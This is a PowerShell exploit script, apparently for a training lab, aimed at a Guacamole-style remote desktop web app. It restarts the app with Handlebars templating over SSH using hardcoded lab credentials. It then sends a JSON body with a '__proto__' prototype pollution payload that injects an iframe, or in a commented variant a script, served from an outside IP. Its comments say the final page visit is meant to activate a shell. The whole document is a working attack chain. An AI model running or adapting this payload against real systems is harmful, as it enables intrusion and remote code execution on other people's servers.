Import-Module Posh-SSH;
[string]$userName = 'student'
[string]$userPassword = 'studentlab'
[string]$machine = 'chips'
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

$worker = New-SSHSession -ComputerName $machine -Credential $credObject
$worker
$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=hbs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
$result

Write-Output "Allowing application to start up sleeping for 10 seconds ..."
Start-Sleep -Seconds 10

$res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using Handlebars as Templating Engine -->' | % -process {$_.Matches.Value}
Write-Output "Templating engine: $res"

$json_obj = @{
  "connection"= @{
    "type"="rdp";
    "settings"= @{
      "hostname"="rdesktop";
      "username"="abc";
      "password"="abc";
      "port"="3389";
      "security"="any";
      "ignore-cert"="true";
      "client-name"="";
      "console"="false";
      "initial-program"="";
      "__proto__" = @{
        # this is more of a troll p.o.c
        "pendingContent"="<iframe src= 'http://192.168.119.144/donkey.html' width='100%' height='100%'>";
        # if we actually wanted to run some javascript
        #"pendingContent"="<script src= 'http://192.168.119.144/donkey.js'>";
      }
    };
 }
}
$json = convertto-json $json_obj -depth 4
$res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck
$res_content = ConvertFrom-Json $res.Content
Write-Output "rdp token: $($res_content.token)"

# The guaclite tunnel is triggered by the /rdp endpoint but it uses window.location.search to populate the rdp token for the guaclite tunnel so we use selenium + headless firefox to "proxy" a connection over the guaclite tunnel.
$status = python trigger-guaclite-tunnel.py --token $res_content.token
Write-Host "Status: $status"

#The last part would be to visit any page of the web application to activate the shell, seems like this must be done from a browser as well.
#iwr -Uri http://chips/ -SkipHttpErrorCheck
Start-Job -ScriptBlock { python visit-page.py }
